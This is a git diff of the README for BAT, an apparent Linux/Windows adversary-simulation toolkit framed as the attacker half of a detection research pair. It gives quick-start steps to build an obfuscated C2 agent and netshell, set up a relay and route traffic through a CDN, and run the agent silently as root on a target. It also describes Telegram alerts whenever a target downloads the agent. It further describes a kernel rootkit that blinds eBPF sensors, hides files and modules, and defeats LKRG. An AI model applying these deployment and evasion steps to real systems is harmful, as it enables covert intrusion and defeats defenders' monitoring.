@@ -1,20 +1,86 @@
-# Bat v11
+# Behavioral Adversary Tracer (BAT)
 
-Bat is a realistic, evolving adversary threat model for Linux. It is not a C2 framework and it is not a rootkit. It is a complete threat simulation platform that integrates C2 communication, kernel-level stealth, userspace evasion, privilege escalation, persistence, process injection, credential harvesting, exfiltration, and lateral movement into a single cohesive adversary. The design goal is to be the most sophisticated and realistic Linux threat achievable in 2026, independent of what any detection system currently catches.
-
-Bat is the adversary side of a research pair. The Aura eBPF detection framework evolves to detect Bat. Bat evolves to evade Aura. The adversary is never constrained by the detector.
+<img width="1870" height="841" alt="banner0" src="https://github.com/user-attachments/assets/bf636b99-b29f-4470-b731-e6fa50a54ea7" />
 
 ---
 
-## Stealth Layer: Singularity
+**BAT** is a realistic, evolving adversary threat model for Linux and Windows. It is not a C2 framework and it is not a rootkit. It is a complete threat simulation platform that integrates C2 communication, kernel-level stealth rootkit modules, userspace evasion, privilege escalation, persistence, process injection, credential harvesting, exfiltration, and lateral movement into a single cohesive adversary. The design goal is to be the most sophisticated and realistic Linux threat achievable in 2026, independent of what any detection system currently catches.
 
-The kernel stealth layer (`bat-stealth.ko`, source in `kperf-qos/`) is built directly on top of **Singularity**, a kernel rootkit research framework. Four core modules were ported and adapted:
+It is the adversary side of a research pair. The Aura framework evolves to detect Bat. Bat evolves to evade Aura. The adversary is never constrained by the detector.
+
+---
+
+<img width="1220" height="2098" alt="ss" src="https://github.com/user-attachments/assets/9d4d6df7-343b-4f8e-af64-b20cd8018d67" />
+
+
+## Quick Start
+
+### 1. Prerequisites
+
+```bash
+apt install nasm gcc-x86_64-linux-gnu binutils-x86_64-linux-gnu golang-go
+go install mvdan.cc/garble@latest
+```
+
+### 2. Configure
+
+```bash
+cp build.env.example build.env
+nano build.env      # RELAY_IP, SECRET, BAT_KEY, CDN_DOMAIN
+```
+
+Generate a secret: `openssl rand -hex 16`
+
+### 3. Build
+
+```bash
+./build.sh              # garble agent (x86_64+arm64) + server (arm64) + netshell
+./build.sh agent        # agent only
+./build.sh server       # server arm64 only (EC2 / Mac M-series)
+./build.sh server-amd64 # server x86_64 only (PC Intel/AMD)
+./build.sh netshell     # netshell only
+```
+
+Binaries land in `bin/`.
+
+### 4. Bootstrap the relay
+
+```bash
+# on the relay VPS (as root)
+sudo bash -s -- --tg-token $TG_TOKEN --tg-chat-id $TG_CHAT_ID < relay/setup.sh
+
+# from the operator machine
+source build.env
+relay/sync.sh ubuntu@$RELAY_IP --key $BAT_KEY --restart-kcc --tg
+scp -i $BAT_KEY bin/netshell-v11-{x86_64,arm64} ubuntu@$RELAY_IP:/var/www/nexus/agents/
+```
+
+### 5. Run
+
+```bash
+./bin/bat-server-v11-arm64          # tunnel starts automatically, no flags needed
+```
+
+Deploy an agent on the target:
+
+```bash
+sudo setsid /path/to/bat-agent-v11-x86_64 </dev/null >/tmp/.log 2>&1 &
+disown
+```
+
+Agent appears in `bat-server` as `<agentID>@<hostname>` within one beacon interval (default 30s).
+
+---
+
+## Linux Stealth Layer: [Singularity](https://github.com/MatheuZSecurity/Singularity)
+
+The kernel stealth layer (`bat-stealth.ko`, source in `kperf-qos/`) is built directly on top of **Singularity**, an advanced kernel rootkit research framework. Four core modules were ported and adapted:
 
 **`bpf_hook`**: Intercepts `bpf(2)` and all eBPF communication primitives. Any eBPF sensor receives zero telemetry for hidden PIDs. Adapted: `ARCH_SYS("bpf")` replaces the x86-only `__x64_sys_bpf`; `__ia32_sys_bpf` removed for ARM64; `HIDDEN_PORT` replaced by a sysfs-configurable global.
 
 **`hiding_fs`**: Complete filesystem erasure: `getdents64`/`getdents` filtering, `stat`/`statx`/`newfstatat` nlink adjustment, `openat`/`access`/`faccessat` `/proc/<pid>` blocking, chdir and readlink blocking. Merged from five Singularity modules (`hiding_directory`, `hiding_stat`, `open`, `hiding_chdir`, `hiding_readlink`). Adapted: `REGS_ARGn` macros replace direct register access; `should_hide_path()` extended for runtime-configured `bat_hidden_paths[]`.
 
-**`hide_module`**: Removes `bat-stealth.ko` from all kernel module lists. Extended: Singularity saves only `list.prev`; this version saves both `list.prev` and `list.next` and poisons both to block traversal in either direction. Added `module_unhide()` for reversible removal, required by K-99 before `delete_module(2)` can locate the module by name.
+**`hide_module`**: Removes `bat-stealth.ko` from all kernel module lists. Extended: Singularity already saves `list.prev`; this version saves both `list.prev` and `list.next` and poisons both to block traversal in either direction. Added `module_unhide()` for reversible removal, required by K-99 before `delete_module(2)` can locate the module by name.
 
 **`lkrg_bypass`**: Suppresses LKRG enforcement for hidden processes: hooks signal delivery to block `SIGKILL` for hidden tasks, hooks `vprintk_emit` to drop LKRG log messages, disables UMH validation during agent execution. Ported directly with no architectural changes.
 
@@ -184,62 +250,6 @@ Console commands (in `bat-server` prompt):
 
 ---
 
-## Quick Start
-
-### 1. Prerequisites
-
-```bash
-apt install nasm gcc-x86_64-linux-gnu binutils-x86_64-linux-gnu golang-go
-go install mvdan.cc/garble@latest
-```
-
-### 2. Configure
-
-```bash
-cp build.env.example build.env
-nano build.env      # RELAY_IP, SECRET, BAT_KEY, CDN_DOMAIN
-```
-
-Generate a secret: `openssl rand -hex 16`
-
-### 3. Build
-
-```bash
-./build.sh              # garble agent (x86_64+arm64) + server (arm64) + netshell
-./build.sh agent        # agent only
-./build.sh server       # server arm64 only (EC2 / Mac M-series)
-./build.sh server-amd64 # server x86_64 only (PC Intel/AMD)
-./build.sh netshell     # netshell only
-```
-
-Binaries land in `bin/`.
-
-### 4. Bootstrap the relay
-
-```bash
-# on the relay VPS (as root)
-sudo bash -s -- --tg-token $TG_TOKEN --tg-chat-id $TG_CHAT_ID < relay/setup.sh
-
-# from the operator machine
-source build.env
-relay/sync.sh ubuntu@$RELAY_IP --key $BAT_KEY --restart-kcc --tg
-scp -i $BAT_KEY bin/netshell-v11-{x86_64,arm64} ubuntu@$RELAY_IP:/var/www/nexus/agents/
-```
-
-### 5. Run
-
-```bash
-./bin/bat-server-v11-arm64          # tunnel starts automatically, no flags needed
-```
-
-Deploy an agent on the target:
-
-```bash
-sudo setsid /path/to/bat-agent-v11-x86_64 </dev/null >/tmp/.log 2>&1 &
-disown
-```
-
-Agent appears in `bat-server` as `<agentID>@<hostname>` within one beacon interval (default 30s).
 
 ### KCC: Kernel Compile Cache
 
@@ -287,6 +297,11 @@ All profiles require `SECRET=`. Override relay IP with `RELAY=<ip>`.
 The CDN profile routes agent traffic through an edge proxy layer. The agent connects to the CDN domain over HTTPS; the proxy forwards traffic to the relay's local listener over the SSH reverse tunnel. From a network perspective, all agent traffic originates from CDN edge IP ranges rather than the relay VPS.
 
 ### Delivery Notifications via Telegram
+
+---
+<img width="1220" height="2028" alt="tg" src="https://github.com/user-attachments/assets/50a0ffb6-44fc-4f0b-8757-614fd9ca0285" />
+---
+
 
 When a target fetches the agent binary from the CDN endpoint, a delivery alert is dispatched instantly to a configured Telegram channel. The notification includes: source IP, timestamp, request path, detected architecture (x86_64/arm64), file size, User-Agent string, and CDN edge identifier.
 
